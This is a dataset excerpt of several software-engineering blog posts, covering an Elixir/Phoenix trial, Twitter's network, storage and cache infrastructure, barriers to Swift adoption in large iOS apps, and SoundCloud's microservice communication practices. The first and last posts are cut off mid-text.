which is still our go to for most products  It was the reason for using Node js on products that require near real time distribution of messages across many clients  And it inspires ongoing experimentation and evaluation of any new  promising tech   How might Elixir and Phoenix fit into this evolution   The hypothesis we re testing is that Elixir and Phoenix will be as productive   maybe more   as other stacks we have used  while giving us better performance  stability and scalability out of the box  No better way to find out than to try it   Elixir and Phoenix  in the tiniest nutshell   Haven t heard of Elixir or Phoenix  Here s what you need to know  Elixir is about 4 years old  It s a new functional language designed for productivity and maintainability that runs on the Erlang VM  The Erlang VM is time tested  more than 20 years old   very fast and has awesome concurrency and inter process communication  called OTP   Phoenix is a modern web framework that makes building APIs and web applications easy  Since it s built with Elixir and runs on that awesome Erlang VM  it s fast as hell and has excellent support for handling very large numbers of simultaneous users  More information is a Google search away   What Have We Learned   We learned a lot by rewriting one of our own applications in Elixir and Phoenix  The application is a project  and people tracking tool  It shows who s working on what  what skills each person has  when people are taking vacations  and rotations between projects  It supports real time updates and collaboration with numerous simultaneous users  We use it everyday to help run our business   As the product owner  I learned that smart full stack Ruby developers can pick Elixir and Phoenix up quickly and get real work done without that much ramp up  This rewrite took between 5 6 developer weeks total  We treated it like a real project and didn t skimp on code quality  tests  loading assets from a CDN  database bootstrapping  for easy first time development   writing efficient queries in Ecto  or anything else   All of the developers really enjoyed working in Elixir and with Phoenix  Here s what they had to say about it   Elixir has been my first time working with functional programming  I d say that the functional paradigm and immutable data are the biggest benefit of building a Phoenix application  Coming from OO  it definitely takes some time to get used to  but for me it makes the code easier to reason about and reduces some of the cognitive load of trying to remember what is isn t mutable  That s usually what people say about functional languages  but I experienced it in practice   Alex  I really enjoy being able to specify contracts in my function definitions with pattern matching  Like being able to say   this function should absolutely accept only these parameters   I can delegate all my worries about error handling to the supervisors  Along with that I feel like I can express myself in simpler terms in Elixir  Especially with pipelining data transformations  I can write out each step and it s clear what should be happening  Overall I just feel empowered to solve hard problems with Elixir  I don t know if that s because of the concurrency and supervisors  or syntax  or all of the tooling that s already built in to Erlang  But the stuff I struggle with in Ruby and JS just doesn t get in my way with Elixir   Chris  Takeaways  Phoenix is productive  but isn t as productive as Rails  yet  There are good reasons for this  most prominently  our lack of experience with Elixir and the relative newness of the open source ecosystem  i e  fewer libraries   Having said that  our team was still very productive  I can see the gap closing quickly  We re helping close the gap by contributing to the language and framework  and through new projects like Wallaby   Phoenix performs better out of the box  A rather large JSON request was taking about 1 5 2 0s against our Rails backend  no caching   That same request  same h w  database queries and data  takes about 400ms with Phoenix  The standard deviation was much lower with Phoenix too  We didn t go deep on the benchmarking this time around  but maybe we will and share our findings in another post   Channels are easy to use and fast  We migrated from Pusher  a great service   to Channels  which removed an external service  reducing cost and simplifying things operationally without increasing app complexity  The migration was painless and Channels are solid   Between low latency and Channels  the application went from sluggish to extremely responsive  without having to introduce page  fragment  or  Russian doll  caching  Everyone who uses the application commented on how the app  works much better  now  Interestingly  the only thing that changed was the responsiveness  Goes to show that high latency makes an application feel broken  not just slow   The Erlang VM makes much better use of resources  Our application went from using just shy of 1 GB across 2 dynos to a single dyno using less than 100 MB  That single dyno is notably faster and can handle higher concurrency  about 10x    Elixir Erlang is less fiddly than Ruby or Node js from an ops standpoint  Erlang Elixir doesn t have an GIL  like MRI Ruby does  and a single  operating system  process makes use of all available cores  unlike Node js   Additionally  there are no long  unpredictable GC pauses due to how the Erlang VM works  You can even deploy new code to a running VM without having to restart the process  how cool is that      Still evaluating   We re not done evaluating as there are some things you can t answer with a short project  Here are some of the things we hope will be true   Productivity will continue to improve as the community and platform mature  Our hope is that Elixir and Phoenix match or beat the productivity we ve seen with Ruby on Rails over the years   Phoenix  without caching  will perform better than Rails  with caching   We already know this is true on a small app  and we can t wait to see how it pans out on a large one  We don t expect to completely avoid caching with Phoenix  but it would be nice to avoid having to do it aggressively and early  as we have had to on our Rails projects to get reasonable performance and latency  Rails makes it  easy   but it s still time consuming and hard to get right  It also creates friction that reduces productivity    Cost per active 1000 users  will be much lower than with other platforms  We really want to see what scaling looks like for a mid to high traffic application  We ve seen others  benchmarks and they look good  but nothing beats first hand experience   It will be easy to maintain a large  growing Phoenix application  Small apps are easy to keep clean and simple  even elegant  What happens after 6 months or a year of development  It is easy to keep the code well factored  create good abstractions  and manage technical debt  Stay tuned for that in a future post   Phoenix applications will be more stable and less bug prone given the functional immutable nature of Elixir  This will be hard to measure  but I think we ll be able to make a reasonable judgement call after a few months   Other Important Questions  Is it a safe bet  Will this tech be around in a few years   We can t predict the future  but the signs certainly suggest it will be  When you look at the number of conferences  meetups  newsletters and other signals  you see something that has reached escape velocity and is picking up speed  There are big products that leverage Elixir  including Bleacher Report and Pinterest  And there are plenty built on Erlang  including WhatsApp and parts of the Heroku platform   Will I be able to hire developers   There are certainly fewer Elixir developers out there than just about any other stack  which at first may sound like a problem  but may not be  There are also significantly fewer companies competing for those people  which makes it easier to stand out compared to those competing with you over talent  We ve also seen a trend in senior Ruby developers wanting to cross over to Elixir  rather than build yet another Rails app  Elixir is a shiny new thing with real promise  which helps attract very enthusiastic developers   Can I use the services I know and love  like GitHub  Heroku  CircleCI  Code Climate  New Relic  etc   Mostly  with a few caveats  We re using GitHub  Heroku and CircleCI and they all work great  CircleCI needs a couple of additions to the circle yml  but it s nothing unusual  New Relic doesn t support Elixir Phoenix yet  but there s the Erlang Observer and Exometer  see measuring your phoenix app   Code Climate doesn t work out of the box  but if you re adventurous  there are some projects you can probably get working   All of this is to say  we didn t find it hard to get started and stay productive  the things we rely on most heavily basically just worked   Conclusion  We re bullish on Elixir and Phoenix and are excited to see what it s like to build more apps and live with them for a while  We re about to start our next Phoenix project   a web app and mobile API   and will keep contributing to the open source ecosystem  Who knows where we ll be in a year  Maybe half  most   of our projects will be Phoenix projects  Can t wait to find out   Suggested Reading  Feedback  Comments  18,"[1335 26 90 214 257 316 607 778 1300 61 234]"
1336,training-dataset/engineering/582.txt,engineering,The Infrastructure Behind Twitter  ScaleOverview of Twitter Fleet  Twitter came of age when hardware from physical enterprise vendors ruled the data center  Since then we ve continually engineered and refreshed our fleet to take advantage of the latest open standards in technology and hardware efficiency in order to deliver the best possible experience   Our current distribution of hardware is shown below   Network Traffic  We started to migrate from third party hosting in early 2010  which meant we had to learn how to build and run our infrastructure internally  and with limited visibility into the core infrastructure needs  we began iterating through various network designs  hardware  and vendors   By late 2010  we finalized our first network architecture which was designed to address the scale and service issues we encountered in the hosted colo  We had deep buffer ToRs to support bursty service traffic and carrier grade core switches with no oversubscription at that layer  This supported the early version of Twitter through some notable engineering achievements like the TPS record we hit during Castle in the Sky and World Cup 2014   Fast forward a few years and we were running a network with POPs on five continents and data centers with hundreds of thousands of servers  In early 2015 we started experiencing some growing pains due to changing service architecture and increased capacity needs  ultimately reaching physical scalability limits in the data center when a full mesh topology would not support additional hardware needed to add new racks  Additionally  our existing data center IGP began to behave unexpectedly due to this increasing route scale and topology complexity   To address this  we started to convert existing data centers to a Clos topology   BGP   a conversion which had to be done on a live network  yet  despite the complexity  was completed with minimal impact to services in a relatively short time span  The network now looks like this   Highlights of the new approach   Smaller blast radius of a single device failure   Horizontal bandwidth scaling capabilities   Lower routing engine CPU overhead  far more efficient processing of route updates   Higher route capacity due to lower CPU overhead   More granular control of routing policy on a per device and link basis   No longer exposed to several known root causes of prior major incidents  increased protocol reconvergence times  route churn issues and unexpected issues with inherent OSPF complexities   Enables non impacting rack migrations   Let s expand on our network infrastructure below   Data Center Traffic  Challenges  Our first data center was built by modeling the capacity and traffic profiles from the known system in the colo  But just a few years later  our data centers are now 400  larger than the original design  And now  as our application stack has evolved and Twitter has become more distributed  traffic profiles have changed as well  The original assumptions that guided our early network designs no longer held true   Our traffic grows faster than we can re architect an entire datacenter so it s important to build a highly scalable architecture that will allow adding capacity incrementally instead in forklift esque migrations   High fanout microservices demand a highly reliable network that can handle a variety of traffic  Our traffic ranges from long lived TCP connections to ad hoc mapreduce jobs to incredibly short microbursts  Our initial answer to these diverse traffic patterns was to deploy network devices that featured deep packet buffers but this came with its own set of problems  higher cost and higher hardware complexity  Later designs used more standard buffer sizes and cut through switching features alongside a better tuned TCP stack server side to more gracefully handle microbursts   Lessons Learned  Over the years and through these improvements  we ve learned a few things worth calling out   Architect beyond the original specifications and requirements and make quick and bold changes if traffic trends toward the upper end of your designed capacity   Rely on data and metrics to make the correct technical design decisions  and ensure those metrics are understandable to network operators   this is particularly important in hosted and cloud environments   There is no such a thing as a temporary change or workaround  In most cases  workarounds are tech debt   Backbone Traffic  Challenges  Our backbone traffic has grown dramatically year over year   and we still see bursts of 3 4X of normal traffic when moving traffic between datacenters  This creates unique challenges for historical protocols that were never designed to deal with this such as the MPLSRSVP protocol where it assumes some form of a gradual ramp up  not sudden bursts  We have had to spend extensive time tuning these protocols in order to gain the fastest possible response times  Additionally  to deal with with traffic spikes  storage replication in particular  we have implemented prioritization  While we need to guarantee delivery of customer traffic at all times  we can afford to delay delivery of low priority storage replication jobs that have a days long SLA  This way  our network uses all available capacity and makes the most possible efficient use of resources  Customer traffic is always more important than low priority backend traffic  Further  to solve the bin packing issues that come with RSVP auto bandwidth  we have implemented TE    which  as traffic increases  creates additional LSPs and removes them when traffic drops off  This allows us to efficiently manage traffic between links while reducing the CPU burden of maintaining large amounts of LSPs   While originally the backbone lacked any form of traffic engineering  it s been added to help us scale according to our growth  To aid this we ve completed a separation of roles in order to have separate routers dedicated to core and edge routing respectively  This has also allowed us to scale in a cost effective manner as we haven t had to buy routers with complicated edge functionality   At the edge this means we have a core to connect everything through and are able to scale in a very horizontal manner  i e  have many  many routers per site  rather than only a couple   as we have a core layer to interconnect everything through    In order to scale the RIB in our routers  we ve had to introduce route reflection to meet our scale demands  but in doing this  and moving to a hierarchical design  we made also made the route reflectors clients of their own route reflectors   Lesson Learned  Over the last year we ve migrated device configurations into templates and are now regularly auditing them   Edge Traffic  Twitter s worldwide network directly interconnects with over 3 000 unique networks in many datacenters worldwide  Direct traffic delivery is our first priority  We haul 60  of our traffic over our global network backbone to interconnection points and POPs where we have local front end servers terminating client sessions  all in order to be as close as possible to the customer   Challenges  World events that are impossible to predict result in equally unpredictable burst traffic  These bursts during large events such as sports  elections  natural disasters  and other newsworthy events stress our network infrastructure  particularly photo and video  with little to no advance notice  We provision capacity for these events and plan for large utilization spikes   often 3 10x normal peaks when we have major events upcoming in a region  Because of our significant year over year traffic growth  keeping up with capacity can be a real challenge   While we peer wherever possible with all of our customers networks  this doesn t come without it s challenges  Surprisingly often  networks or providers prefer to interconnect away from home markets  or  due to their routing policies  cause traffic to arrive in POPs that are out of markets  And while Twitter openly peers with all major eyeball  customers  networks we see traffic on  not all ISPs do  We spend a significant amount of time optimizing our routing policies to serve traffic as close to our users and as directly as possible   Lesson Learned  Historically  when someone requested  www twitter com   based on the location of their DNS server  we would pass them different regional IPs to map them to a specific cluster of servers  This methodology   GeoDNS   is partially inaccurate due to the fact that we cannot rely on users to map to the correct DNS servers  or on our ability to detect where DNS servers are physically located in the world  Additionally  the topology of the internet does not always match geography   To solve this we have moved to a  BGP Anycast  model where we announce the same route from all locations and optimize our routing to take the best paths from customers to our POPs  By doing this we get the best possible performance within the constraints of the topology of the internet and don t have to rely on unpredictable assumptions about DNS servers exist   Storage  Hundreds of millions of Tweets are sent every day  They are processed  stored  cached  served and analyzed  With such massive content  we need a consequent infrastructure  Storage and messaging represents 45  of Twitter s infrastructure footprint   The storage and messaging teams provide the following services   Hadoop clusters running both compute and HDFS Manhattan clusters for all our low latency key value stores Graph stores sharded MySQL clusters Blobstore clusters for all our large objects  videos  pictures  binary files   Cache clusters Messaging clusters Relational stores  MySQL  PostgreSQL and Vertica   Challenges  While there are a number of different challenges at this scale multi tenancy is one of the more notable ones we ve had to overcome  Often customers have corner cases that would impact existing tenants and force us to build dedicated clusters  More dedicated clusters increases the operational workload to keep things running   There are no surprises in our infrastructure but some of the interesting bits are as follows   Hadoop  We have multiple clusters storing over 500 PB divided in four groups  real time  processing  data warehouse and cold storage   Our biggest cluster is over 10k nodes  We run 150k applications and launch 130M containers per day   Manhattan the backend for Tweets  Direct Messages  Twitter accounts  and more   We run several clusters for different use cases such as large multi tenant  smaller for non common  read only  and read write for heavy write heavy read traffic patterns  The read only cluster handles 10s of millions QPS whereas a read write cluster handles millions of QPS  The highest performance cluster  our observability cluster  which ingests in every datacenter  handles over tens of million writes   Graph  Our legacy Gizzard MySQL based sharded cluster for storing our graphs  Flock  our social graph  can manage peaks over tens of million QPS  averaging our MySQL servers to 30k   45k QPS   Blobstore  Our image  video and large file store where we store hundreds of billions objects   Cache  Our Redis and Memcache clusters  caching our users  timelines  tweets and more   SQL  This includes MySQL  PostgreSQL and Vertica  MySQL PosgreSQL are used where we need strong consistency  managing ads campaign  ads exchange as well as internal tools  Vertica is a column store often used as a backend for Tableau supporting sales and user organisations   Hadoop HDFS is also the backend to our Scribe based log pipeline  but in the final testing phases of the transition to Apache Flume as a replacement in order to address limitations like a lack of rate limiting throttling of selective clients to aggregators  lack of delivery guarantee for categories  and to solve memory corruption issues  We handle over a trillion messages per day and all of these are processed into over 500 categories  consolidated and then and selectively copied across all our clusters   Chronological Evolution  Twitter was built on MySQL and originally all data was stored on it  We went from a small database instance to a large one  and eventually many large database clusters  Manually moving data across MySQL instances requires a lot of time consuming hands on work  so in April 2010 we introduced Gizzard   a framework for creating distributed datastores   The ecosystem at the time was   Replicated MySQL clusters  Gizzard based sharded MySQL clusters  Following the release of Gizzard in May 2010  we introduced FlockDB  a graph storage solution on top of Gizzard and MySQL  and in June 2010  Snowflake our unique identifier service  2010 was also when we invested in Hadoop  Originally intended to store MySQL backups  it now is heavily used for analytics   Around 2010  we also added Cassandra as a storage solution  and while it didn t fully replace MySQL due to it s lack of an auto increment feature  it did gain adoption as a metrics store  As traffic was growing exponentially we needed to grow the cluster  and  in April 2014 we launched Manhattan  our real time  multi tenant distributed database  Since then Manhattan has become one of our most common storage layers and Cassandra has been deprecated   In December 2012  Twitter released a feature to allow native photo uploads  Behind the scenes  this was made possible by a new storage solution Blobstore   Lesson Learned  Over the years  as we ve migrated data from MySQL to Manhattan to take advantage of better availability  lower latency  and easier development  we ve also adopted additional storage engines  LSM  b tree   to better serve our traffic patterns  Additionally  we ve learned from incidents and have started protecting our storage layers from abuse by sending a back pressure signal and enabling query filtering   We continue to be focused on providing the right tool for the job  but this means legitimately understanding all possible use cases  A  one size fits all  solution rarely works   avoid building shortcuts for corner cases as there is nothing more permanent than a temporary solution  Lastly  don t oversell a solution  Everything has pros and cons and needs to be adopted with a sense of realism   Cache  While Cache is  3  of our infrastructure  it is critical for Twitter  It protects our backing stores from heavy read traffic and allows for storing objects which have heavy hydration costs  We use a few cache technologies  like Redis and Twemcache  at enormous scale  More specifically  we have a mix of dedicated and multi tenant Twitter memcached  twemcache  clusters as well as Nighthawk  sharded Redis  clusters  We have migrated nearly all of our main caching to Mesos from bare metal to lower operational cost   Challenges  Scale and performance are the primary challenges for Cache  We operate hundreds of clusters with an aggregate packet rate of 320M packets s  delivering over 120GB s to our clients  and we aim to deliver each response with latency constraints into the 99 9th and 99 99th percentiles even under event spikes   To meet our high throughput and low latency service level objectives  SLOs  we need continually measure the performance of our systems and look for efficiency optimizations  To help us do this we wrote rpc perf to get a better understanding of how our cache systems perform  This was crucial in capacity planning as we migrated from dedicated machines to our current Mesos infrastructure  As a result of these optimization efforts we ve more than doubled our per machine throughput with no change in latency  We still believe there are large optimization gains to be had   Lessons Learned  Moving to Mesos was a huge operational win  We codified our configurations and can deploy slowly to preserve hit rate and avoid causing pain for persistent stores as well as grow and scale this tier with higher confidence   With thousands of connections per twemcache instance  any process restarts  network blips  and other issues could trigger a DDoS esque connect attacks against the cache tier  As we ve scaled  this has become more of an issue  and through benchmarking we ve implemented uptakes rules to throttle connections to each cache individually when high reconnect rates would otherwise cause us to violate our SLOs   We logically partition our caches by users  Tweets  timelines  etc  and in general  every cache cluster is tuned for a particular need  Based on the type of the cluster  they handle between 10M to 50M QPS  and run between hundreds to thousands of instances   Haplo  Allow us to introduce Haplo  It is the primary cache for Tweet timelines and is backed by a customized version of Redis  implementing the HybridList   Haplo is read only from Timeline Service and written to by Timeline Service and Fanout Service  It is also one of our few cache services that we have not migrated to Mesos yet   Aggregated commands between 40M to 100M per second  Network IO 100Mbps per host  Aggregated service requests 800K per second  Further reading  Yao Yue   thinkingfish  has made several great talks and papers about cache over the years  including on our use of Redis  as well as our newer Pelikan codebase  Feel free to check out the videos and a recent blog post  Running Puppet at scale  We run a wide array of core infrastructure services such as Kerberos  Puppet  Postfix  Bastions  Repositories and Egress Proxies  We are focused on scaling  building tooling  managing these services  as well as supporting data center and point of presence  POP  expansion  Just this past year we significantly expanded our POP infrastructure to many new geo locations which required a complete re architecture of how we plan  bootstrap  and launch new locations   We use Puppet for all configuration management and post kickstart package installation of our systems  This section details some of the challenges we have overcome and where we are headed with our configuration management infrastructure   Challenges  In growing to meet the needs of our users  we quickly outgrew standard tools and practices  We have over 100 committers per month  over 500 modules  and over 1 000 roles Ultimately  we have been able to reduce the number of roles  modules  and lines of code all while improving the quality of our codebase   Branching  We have three branches which Puppet refers to as environments  These allow us to properly test  canary  and eventually push changes to our production environment  We do allow for custom branches too  for more isolated testing   Moving changes from testing through to production currently requires a bit of manual handholding  but we are moving towards a more automated CI system with an automated integration backout process   Codebase  Our Puppet repository contains greater than 1 million lines of code with just the Puppet code being more than 100 000 per branch  We have recently undergone a massive effort to cleanup our codebase reducing dead and duplicate code   This graph shows our total lines of code  not including various automatically updated files  from 2008 to today   This graph shows our total file count  not including various automatically updated files  from 2008 to today   This graph shows our average file size  not including various automatically updated files  from 2008 to today   Big Wins  The biggest wins to our codebase have been code linting  style check hooks  documenting of our best practices  and holding regular office hours  With linting tooling  puppet lint  we were able to conform to common community linting standards  We reduced our linting errors and warnings in our codebase by 10s of thousands of lines and touched more than 20  of the codebase   After an initial cleanup  making smaller changes in the codebase is now easier  and incorporating automated style checking as a version control hook has dramatically cut down on style errors in our codebase   With over 100 Puppet committers throughout the organization  documenting internal and community best practices has been a force multiplier  Having a single document to reference has improved the quality and speed at which code can be shipped   Holding regular office hours for assistance  sometimes by invite  has allowed for 1 1 help where tickets and chat channels don t offer high enough communication bandwidth or didn t convey the larger picture of what was trying to be accomplished  As a result  most committers have improved their code quality and speed by understanding the community  best practices  and how to best apply changes   Monitoring  System metrics are not generally useful  see Caitlin McCaffrey s Monitorama s 2016 talk here  but do provide additional context to the metrics that we have found useful   Some of the most useful metrics that we alert upon and graph are   Run Failures  The number of Puppet runs that do not succeed   Run Durations  The time it takes for a Puppet client run to complete   Not Running  The number of Puppet runs that are not happening at the interval that we expect   Catalog Sizes  The size in MB of catalogs   Catalog Compile Time  The time in Seconds that a catalog takes to compile   Catalog Compiles  The number of catalogs being compiled by each Master   File Resources  The number of files being fetched   Each of these metrics is collected per host and aggregated by role  This allows for instant alerting and identification when there are problems across a specific role  set of roles  or a broader impacting event   Impact  By migrating from Puppet 2 to Puppet 3 and upgrading Passenger  both posts for another time   we were able to reduce our average Puppet runtimes on our Mesos clusters from well over 30 minutes to under 5 minutes   This graphs shows our average Puppet runtime in seconds on our Mesos clusters   If you are interested in helping us with our Puppet infrastructure  we are hiring   If you are interested in the more general system provisioning process  metadata database  Audubon   and lifecycle management  Wilson  the Provisioning Engineering team recently presented at our  Compute event and it was recorded here   We couldn t have achieved this without the hard work and dedication of everyone across Twitter Engineering  Kudos to all the current   former engineers who built   contributed to the reliability of Twitter   Special thanks to Brian Martin  Chris Woodfield  David Barr Drew Rothstein  Matt Getty  Pascal Borghino  Rafal Waligora  Scott Engstrom  Tim Hoffman  and Yogi Sharma for their contributions to this blog post,"[1336 1403 597 673 613 902 500 92 1373 1351 42]"
1341,training-dataset/engineering/897.txt,engineering,Why big apps aren t moving to Swift  Yet    Ben Sandofsky   MediumWhy big apps aren t moving to Swift  Yet   I strongly believe Swift is the future of iOS development  It s only a matter of when  and the blocker is the breakneck speed it evolves  For smaller apps  Swift is good enough  For big apps  it s at least a year away   I m using  big  as shorthand for a few different categories  It can mean lines of code  number of developers  complexity  or low tolerance for problems  A lot of them make up the App Store Top 100 Free Apps  In January  Ryan Olson analyzed the chart and found 89  contained zero Swift   That doesn t mean 11  of these apps have adopted it  One team I spoke to has begun experimenting with Swift  to monitor its production readiness in the coming year  The default language for all their new work is still Objective C   If you re working in a smaller app  stop reading  The benefits of Swift 3 0 probably outweigh the risks  If you re curious about the challenges of large companies  large codebases  and complex dependencies  this post should explain why big projects are holding back   Language Churn  Every major Xcode update changes the language and breaks code  Sometimes the code migrator works  and sometimes you need to fix it by hand   This is manageable if you re under 30 000 lines of code  I d wager the most apps in the world out there fall into this category  At the other end of the spectrum is the Facebook app  with 18 000 classes  That s not lines of code  that s classes  Let s say that s a million lines of code   If 2  of that codebase moved to Swift  that s 20 000 lines of code  and it s not going to be in one place  It ll be spread out in disabled experiments or old refactored code paths you aren t sure are still being used   Even if the code migrator  just works   the poor engineer responsible for migration will spend a week running blame to track down the original authors  to verify the updated code still does what it s supposed to do   Of course the company can t halt development during migration  Every day  new code lands  Our poor engineer becomes Sisyphus  but instead of a boulder rolling down the hill  it s merge conflicts   ABI Instability  The lesser known churn is Swift s internal evolution   most important  the Application Binary Interface  An ABI defines the layout of data structures  how arguments are pushed onto the stack  how applications make system calls  and other nuts and bolts with no bearing on 99 99  of daily development   Swift 3 0 was going to lock down the ABI  but the Swift team recently announced it won t make the cut  What does this mean   An ABI matters when two isolated modules of code need to talk to each other  For example  C can call Ruby code so long as it sets up a stack frame in a way the runtime expects   Say you built a framework in Swift 2 2  and the app that consumes also runs Swift 2 2  Despite both apps being built independently  they can talk to each other  because they all talk in the same low level structures   Say you move your app to Swift 3 0  If the ABI changed so that arguments are placed in different spots in the stack frame  you ll  hopefully  crash   The only solution is to compile everything with the same version of Swift  Migrate your framework to Swift 3 0 at the same time as your main app   Don t Build an SDK in Swift  If you re providing a pre compiled SDK  an unstable ABI makes life miserable  When a new version of Swift drops  you need to immediately recompile and distribute the latest version to your users   Say the latest version of your SDK is 2 0  Your customers may be on 1 0  which you still support  because 2 0 had breaking changes  Not only do you need to migrate the latest version of your SDK to the latest Swift  but you need to migrate your old SDK too   Another issue that can affect your SDK s adoption is the hit on an app s download size  Because the Swift core libraries aren t shared on iOS  they re bundled within the app  In a pure Objective C app  adding a Swift powered SDK carries a five megabyte penalty   Watch out for Complicated Dependencies  Companies with multiple apps often share internal frameworks  These might include infrastructure like the networking stack  or product facing features like a login screen   Because all frameworks need to run the same version of Swift  all your apps need to transition at the same time  A company like Facebook would need to migrate the main Facebook App  Messenger  Groups  and whatever else  This means coordinating dozens of teams and hundreds of developers   Issues with Tooling  Even on frameworks compiled within the same workspace  LLDB has issues with mixed language frameworks  For example  you ll get a crash if you set a breakpoint in your network stack  Framework A  taking your a model  Framework B  as an argument   In very large codebases  using pre compiled frameworks of your own code have a meaningful reduction in build times  Unfortunately  you re left trading debugability for longer build times  or jumping through hoops toggling project targets on a file by file basis when it comes time to debug   When mixing and matching Objective C and Swift across several frameworks  you can make SourceKit crash as frequently as July 2014  with Swift 1 0  You lose syntax highlighting and code completion  This is a meaningful barrier to new Swift developers  or when working Cocoa s infamously long winded method names   While this doesn t strictly have to do with the ABI  ABI stability is a blocker   Framework Assisted Migration  To wrap up ABI talk  let s not just focus on negatives  ABI stability can mitigate the much larger roadblock  language churn   A strategy I ve seen among big apps is to decompose their app into frameworks even though the code isn t used in any other apps  Frameworks enforce boundaries that make testing easier  and clarify code ownership   With a stable ABI  you can keep each of these frameworks on an old version of Swift  and migrate them piecemeal  Each team can be responsible for migrating their own code   Summary  This might sound like I m trashing the Swift team s work  but that s absolutely not the case  The Swift team has prioritized evolving the language and ecosystem  instead of stability and dealing with edge cases  That s a perfectly reasonable tradeoff   Even if the platform were stable  big companies switch platforms at glacial speeds  It took Adobe a decade to move Photoshop from Carbon to Cocoa You ll get better feedback from early adopters than large apps  and you won t be tied down by multi year commitments to stability   It s worth repeating  most of what I described probably doesn t apply to you  You re probably working on a much smaller codebase with much simpler dependencies  The advantages of Swift 3 0 likely outweigh the drawbacks,"[1341 980 1300 1399 1225 713 234 656 1392 778 673]"
1347,training-dataset/engineering/516.txt,engineering,Synchronous communication for microservices  current status and learningsSince we started breaking our monolith and introduced a microservices architecture we rely a lot on synchronous request response style communication  In this blog post we ll go over our current status and some of the lessons we learned   Finagle and jvmkit  Most of our microservices are built on top of Finagle and are written in Scala  Finagle is a highly extensible and protocol agnostic RPC framework developed by Twitter   Finagle clients and servers use non blocking I O on top of Netty  Non blocking I O improves our scalability since we have a lot of scatter gather style microservices or microservices that are I O bound on external resources like databases   Finagle is also highly configurable and extensible which means we can tailor it to work well with our infrastructure   To make it easy for developers to build microservices that play nicely with the SoundCloud infrastructure and conventions we have an internal library called jvmkit which is maintained by our Core Services team  Some of the functionality jvmkit provides   Wrappers around Finagle HTTP  memcached and MySQL with reasonable default configurations and integration with Prometheus  DNS based service discovery implementation  HTTP request routing on top of Finagle  JSON parsing support for request   response entities  Logging support according to our standards  API support for rollout our feature toggle system  Teams are responsible from development till running their microservices in production so they can decide not to use jvmkit as long as they stick to our standard protocol  In practice however most of our microservices do use jvmkit  By using jvmkit teams have more time to focus on delivering business features   HTTP 1 1   JSON  Almost all our services use HTTP 1 1   JSON for communication   The advantage of HTTP   JSON is that it is supported everywhere so we don t lock ourselves into a specific technology or programming language   There is very good tooling support for HTTP   JSON which makes it easy to debug and interact with our services   The HTTP method indicates useful properties of requests  It indicates if a request is idempotent and safe  read only   These properties tell us if requests can be safely retried or cached  We found this useful when replaying requests to test new revisions of a service  Indication of these properties are missing from other protocols we looked into   Of course HTTP   JSON results in more overhead compared to other more optimized protocols  We have some services using Finagle ThriftMux and have thought about making ThriftMux the recommended protocol but we stepped away from that idea  ThriftMux is not ubiquitous and would lock us into Finagle if we want to get all the benefits   Client side service discovery and load balancing  When we started using microservices we used separate load balancer processes as entry points for our services  With the increase in traffic we ran into failing load balancer processes which caused several outages  Our load balancers were single points of failure   These outages made us move to client side service discovery and load balancing  We wrote a Java service discovery implementation that queries DNS SRV records to get the instances for a given service  Writing it in Java means it can be integrated in any JVM based language and framework that supports Service Discovery  We obviously integrated it in Finagle by using the Finagle Resolver api  Having support in Finagle means we have client side service discovery and load balancing support for HTTP  ThriftMux  MySQL and memcached   Resilience against failures  When investigating the root cause of some of our outages we realized that we had to invest more in improving our resilience against failures  It quickly showed how important it is to use a mature library or system like Finagle which is already equipped with important features like   Timeouts  every request across the network needs realistic timeouts  This protects you from issues with the systems you depend on   Transport and application level Circuit Breakers  supports ignoring hosts that become unavailable or unhealthy with automatic recovery when they become healthy again  It protects you from issues with systems you depend on and allows them to recover   Conditional retries  retrying can be effective but you shouldn t retry unconditionally as this can result in retry storms that can overload the systems you depend on  Retry budgets allow you to configure a percentage of requests that can be retried on top of a minimum number within a time frame   Limiting concurrent requests  If you know the capacity your service can handle you can protect it from overload by limiting the maximum number of concurrent requests and waiters  queue size    Using and configuring these features have allowed us to better deal with failures which are inevitable in a distributed system like a microservices architecture   We also introduced automated integration tests for jvmkit which show and document how our systems will react to failures  These tests also notify us about potential behavioural changes when upgrading Finagle   No more client libraries  When we started implementing microservices teams who implemented a service typically also provided a client library that could be used by other teams to access their service  Those client libraries were implemented in the same programming language as the service and were hiding network communication and serializing   deserializing of requests and responses behind an easy to use api  The idea was that the code to access a service only needed to be written once and could be re used by many   After a while we noticed the client libraries approach also brings a lot of disadvantages   A client library brings in dependencies  It might bring in a HTTP library  JSON parsing library etc  This might result in conflicts with the libraries already used by your service  If you depend on more than 1 client library this problem only increases resulting in unnecessary dependencies and conflicts between teams   A client library might become bloated with custom logic  Using the client library might be the only way to successfully use the service and prevents it from being used by applications using other technologies  This imposes the use of a programming language and technology on other teams   A client library can have default error handling logic which is probably not a good fit for all use cases  Users of a service should be aware of the error scenario s that can happen and act upon them in the best way for their use case   A client library will likely parse all returned fields of a response even if the client is only interested in a subset  This not only might have performance implications but also violates the tolerant reader principle   We think these disadvantages far outweigh the benefits  The use of client libraries results in increased coupling and dependencies  Instead of publishing clients we encourage teams to publish their API s  Consumers write their own clients in a way they find most appropriate using their technology of choice   What s next   We hope to introduce Consumer Driven Contract tests soon  These tests will catch breaking changes between services and consumers during build time  Some teams are currently working on proof of concepts and are building out and validating the process   A logical step for us would be to move from HTTP 1 1 to HTTP 2 as our default protocol  This would improve latency while sticking with a widely supported protocol without technology or programming language lock in   We might also replace JSON with a more efficient serialization protocol like protocol buffers  This would further improve performance and should result in less handwritten serialization and deserialization code but this still needs more experimentation and investigation,"[1347 1351 773 92 234 61 278 778 1377 952 548]"
1351,training-dataset/engineering/1204.txt,engineering,Best Practices for Building a Microservice ArchitectureLast updated August 16  2016  Complexity has managed to creep in to your product  It s become increasingly difficult to evolve it at the pace you once could  It s time to look for a better way of doing things  Microservice architectures promise to keep your teams moving fast    but also come with a new set of challenges   In building out a microservice architecture for Enchant  I wanted to document a set of pragmatic practices that fit well with modern web and cloud technologies  I ve tried to learn from those that have gone down this path before  i e  Netflix  Soundcloud  Google  Amazon  Spotify  etc  in order to get more right than wrong   TL DR  A microservice architecture shifts around complexity  Instead of a single complex system  you have a bunch of simple services with complex interactions  Our goal is to keep the complexity in check   The Platform  Service Essentials  Service Interactions  Development  Deployment  Operations  People  Latest from the Enchant blog Make your app great again  A decent app helps you get the job done   A good app helps you get it done faster   A great app  however  makes it effortless         and those apps  the ones that make things feel effortless  are the ones we love the most     But what makes an app feel effortless   More importantly  how can you make your app feel effortless   READ MORE    Identifying The Key Requirements  A microservice architecture adds its own complexities  Instead of a few systems to operate  you now have many  Logs are all over the place  Consistency is hard in a distributed environment  This list can easily go on 